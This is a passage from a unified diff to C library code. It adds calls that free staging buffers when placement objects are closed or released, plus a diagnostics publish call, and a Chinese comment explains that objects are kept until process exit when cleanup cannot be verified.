+    glk43499_placement_publish_diag(result, placement);
     placement->state = 0;
     return glk43499_internal_ptr_handle(placement);
 }
@@ -897,6 +1164,7 @@ int32_t glk43499_close_placement(glk43499_handle placement,
     for (size_t index = 0; index < sizeof(sets) / sizeof(sets[0]); ++index) {
         glk43499_placement_free_ctx(sets[index]);
     }
+    glk43499_placement_free_staging(impl);
     impl->state = 2;
     free(impl);
     glk43499_internal_set_close(result, GLK43499_CALL_OK,
@@ -913,6 +1181,7 @@ int32_t glk43499_close_placement(glk43499_handle placement,
 void glk43499_placement_release(struct glk43499_placement_impl *placement) {
     if (placement == NULL) return;
     if (glk43499_placement_cleanup_all(placement) != 0) {
+        glk43499_placement_free_staging(placement);
         free(placement);
     } else {
         /* 清理无法证明完整：对象与身份保留到进程退出。 */
